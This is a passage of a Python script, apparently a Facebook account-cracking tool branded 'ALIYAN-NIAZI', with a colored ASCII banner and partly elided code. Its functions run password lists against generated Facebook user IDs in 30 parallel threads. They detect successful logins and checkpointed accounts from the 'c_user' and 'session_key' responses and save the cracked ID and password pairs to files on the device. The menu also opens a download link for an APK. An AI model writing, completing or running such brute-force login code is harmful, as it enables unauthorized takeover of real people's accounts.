...
\033[1;35m| $$\ | $$ \$$$$$$|  $$$$$$\ \$$$$$$$$ \$$$$$$
\033[1;34m| $$$\| $$  | $$  | $$__| $$    /  $$   | $$  
\033[1;31m | $$$$\ $$  | $$  | $$    $$   /  $$    | $$  \033[1;34m𝐏 \033[1;37m
\033[1;35m| $$\$$ $$  | $$  | $$$$$$$$  /  $$     | $$  \033[1;31m 𝐑\033[1;37m
\033[1;34m| $$ \$$$$ _| $$_ | $$  | $$ /  $$___  _| $$_ \033[1;35m𝐎 \033[1;37m
\033[1;35m| $$  \$$$|   $$ \| $$  | $$|  $$    \|   $$ \
\033[1;34m \$$   \$$ \$$$$$$ \$$   \$$ \$$$$$$$$ \$$$$$$                                                                                                                                       
----------------------------------------------
 Author    : RAFI ULLAH
 Github    : NIAZI-IS BRAND
 Facebook  : MR.NIAZI
 Tool Name : ALIYAN-NIAZI
 Tool type : FREE
----------------------------------------------
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/NIAZI_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
...
def pak():
                ...
                with tred(max_workers=30) as NIAZI:     
                        ...
                        for psx in user:
                                ...
                                NIAZI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [NIAZI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in NIAZI:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [NIAZI-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/NIAZI-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [NIAZI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NIAZI-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
